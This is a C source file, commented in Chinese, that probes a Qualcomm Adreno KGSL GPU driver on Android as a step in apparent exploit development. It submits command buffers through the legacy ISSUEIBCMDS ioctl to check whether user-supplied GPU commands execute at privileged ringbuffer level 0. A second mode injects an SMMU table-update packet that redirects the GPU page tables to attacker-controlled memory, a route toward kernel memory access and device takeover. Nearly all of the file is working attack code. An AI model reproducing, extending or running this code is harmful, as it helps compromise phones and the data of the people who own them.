/* kgsl_lvl0.c — 判定 0x10(ISSUEIBCMDS) 是否在 RB level 0 执行用户缓冲
 * 判据: 用"无害 NOP 雪橇"走 0x10
 *   - 仍 hard fault  → fault 来自 kgsl 附加序列, 用户内容未必执行(0x10 无价值)
 *   - 不 fault 且 canary 正常 → 我们的内容在 level 0 跑通了 → 下一步塞 0x53
 * 同时对比: 0x10 + 0x53 包 → 观察 GPU 是否被改死(SMMU 切换的信号)
 */
#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include "adrenaline.h"

static int fd; static uint64_t g_clsz;
static uint32_t *buf; static uint64_t buf_ga;
static uint32_t *ib;  static uint64_t ib_ga;
static uint32_t ctx;
static void cvac(void *a, void *b){ char*s=(char*)((uintptr_t)a&~(g_clsz-1));
  for(;s<(char*)b;s+=g_clsz) __asm volatile("dc cvac, %0"::"r"(s):"memory"); __asm volatile("dsb ish":::"memory"); }
static void civac(void *a, void *b){ char*s=(char*)((uintptr_t)a&~(g_clsz-1));
  for(;s<(char*)b;s+=g_clsz) __asm volatile("dc civac, %0"::"r"(s):"memory"); __asm volatile("dsb ish":::"memory"); }
static int submit_4a(uint64_t ga, uint32_t size, uint32_t *ts){
    struct kgsl_command_object c; struct kgsl_gpu_command r;
    memset(&c,0,sizeof(c)); c.flags=KGSL_CMDLIST_IB; c.gpuaddr=ga; c.size=size;
    memset(&r,0,sizeof(r)); r.context_id=ctx; r.cmdsize=sizeof(c); r.numcmds=1; r.cmdlist=(unsigned long)&c;
    int e=ioctl(fd,IOCTL_KGSL_GPU_COMMAND,&r); if(ts)*ts=r.timestamp; return e; }
static void wait_ts(uint32_t ts,uint32_t ms){ struct{uint32_t c,t,to;}w={ctx,ts,ms}; ioctl(fd,_IOWR(0x09,0x07,char[12]),&w); }
static int mapb(void **h,size_t len,uint64_t *ga){
    void*p=mmap(NULL,len,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    if(p==MAP_FAILED) return 1; memset(p,0,len);
    struct kgsl_map_user_mem m; memset(&m,0,sizeof(m));
    m.len=len; m.hostptr=(unsigned long)p; m.memtype=KGSL_USER_MEM_TYPE_ADDR;
    if(ioctl(fd,IOCTL_KGSL_MAP_USER_MEM,&m)) return 1;
    *h=p; *ga=m.gpuaddr; return 0; }

typedef struct { uint64_t gpuaddr, hostptr; uint32_t sizedwords, ctrl; } ibdesc_t;
typedef struct { uint32_t drawctxt_id, pad; uint64_t ibdesc_addr; uint32_t numibs, timestamp, flags, pad2; } issueib_t;

static int submit_10(uint64_t ga, uint32_t sizedwords, uint32_t *ts) {
    ibdesc_t d; issueib_t is;
    memset(&d,0,sizeof(d)); d.gpuaddr=ga; d.sizedwords=sizedwords; d.ctrl=0;
    memset(&is,0,sizeof(is));
    is.drawctxt_id=ctx; is.ibdesc_addr=(uint64_t)(uintptr_t)&d; is.numibs=1;
    int r=ioctl(fd,_IOWR(0x09,0x10,issueib_t),&is);
    if(ts) *ts=is.timestamp;
    return r;
}

/* canary: 0x4A 写 BUF+0x800 */
static int canary(uint32_t val) {
    uint32_t *c = ib;
    *c++ = cp_type7_packet(CP_MEM_WRITE, 3);
    *c++ = (uint32_t)((buf_ga+0x800)&0xFFFFFFFFu); *c++ = (uint32_t)((buf_ga+0x800)>>32);
    *c++ = val;
    uint32_t dw=(uint32_t)(c-ib); cvac(ib,(char*)ib+dw*4);
    *(uint32_t*)((char*)buf+0x800)=0; cvac((char*)buf+0x800,(char*)buf+0x804);
    uint32_t ts=0;
    int r=submit_4a(ib_ga,dw*4,&ts);
    if(!r){ wait_ts(ts,3000); civac((char*)buf+0x800,(char*)buf+0x804); }
    return *(uint32_t*)((char*)buf+0x800);
}

static void fill_nops(uint32_t n) {
    uint32_t *c = buf;
    for (uint32_t i = 0; i < n/2; i++) { *c++ = cp_type7_packet(CP_NOP,1); *c++ = 0; }
    cvac(buf, (char*)buf + n*4);
}
static void fill_smmu(uint64_t ttbr) {
    uint32_t *c = buf;
    *c++ = cp_type7_packet(0x53, 4);
    *c++ = (uint32_t)(ttbr & 0xFFFFFFFFu); *c++ = (uint32_t)(ttbr >> 32);
    *c++ = (uint32_t)(buf_ga & 0xFFFFFFFFu); *c++ = (uint32_t)(buf_ga >> 32);
    for (int i = 0; i < 32; i++) { *c++ = cp_type7_packet(CP_NOP,1); *c++ = 0; }
    cvac(buf, (char*)buf + 0x200);
}

int main(int argc, char **argv) {
    setvbuf(stdout,NULL,_IONBF,0);
    uint64_t ctr; asm("mrs\t%x0, ctr_el0":"=r"(ctr)); g_clsz=4<<((ctr>>16)&0xf);
    fd=open("/dev/kgsl-3d0",O_RDWR|O_CLOEXEC); if(fd<0){printf("open fail\n");return 1;}
    mapb((void**)&buf,0x1000,&buf_ga); mapb((void**)&ib,0x1000,&ib_ga);
    struct kgsl_drawctxt_create cr={.flags=0x1812}; ioctl(fd,IOCTL_KGSL_DRAWCTXT_CREATE,&cr); ctx=cr.drawctxt_id;
    printf("# buf_ga=0x%llx ib_ga=0x%llx ctx=0x%x\n",(unsigned long long)buf_ga,(unsigned long long)ib_ga,ctx);
    int mode = argc>1 ? atoi(argv[1]) : 0;

    if (mode == 0) {
        printf("== A: 0x10 + 64 dwords NOP 雪橇(无害) ==\n");
        fill_nops(64);
        uint32_t ts=0;
        int r = submit_10(buf_ga, 64, &ts);
        printf("  0x10 submit=%d errno=%d ts=%u\n", r, r?errno:0, ts);
        if(!r){ wait_ts(ts,3000); }
        uint32_t can = canary(0xCAFEBABEu);
        printf("  canary=0x%08x %s\n", can, can==0xCAFEBABEu?"GPU 存活":"*** GPU 已失效 ***");
    } else {
        printf("== B: 0x10 + 0x53{ttbr=buf_ga, rec=buf_ga} ==\n");
        fill_smmu(buf_ga);
        uint32_t ts=0;
        int r = submit_10(buf_ga, 0x24, &ts);
        printf("  0x10 submit=%d errno=%d ts=%u\n", r, r?errno:0, ts);
        if(!r){ wait_ts(ts,3000); }
        uint32_t can = canary(0xCAFEBABFu);
        printf("  canary=0x%08x %s\n", can, can==0xCAFEBABFu?"GPU 存活(0x53 未生效)":"*** GPU 状态被改变(可能是 SMMU 切换!) ***");
    }
    printf("done\n");
    return 0;
}
